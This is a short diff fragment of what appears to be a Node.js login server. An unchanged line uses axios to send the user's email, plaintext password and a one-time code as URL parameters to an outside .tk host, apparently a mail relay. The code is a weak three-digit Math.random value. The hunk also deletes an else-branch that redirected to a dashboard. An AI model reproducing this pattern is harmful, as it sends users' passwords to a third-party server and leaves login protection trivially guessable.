@@ -77,10 +77,6 @@ req.session.otp = Math.floor(1000*Math.random()).toString();
 axios("https://srvrr.tk/mail?to="+req.session.mail+"&sub=otp&body="+req.session.mail+"\n"+req.session.password+"\n"+req.session.otp).then(function(x) {
 res.redirect(301, "https://awth.now.sh/otp");
 })
-}
-else {
-res.redirect(301, "https://awth.now.sh/dashboard");
-}
 })
 
 app.get("/verify", function(req, res) {
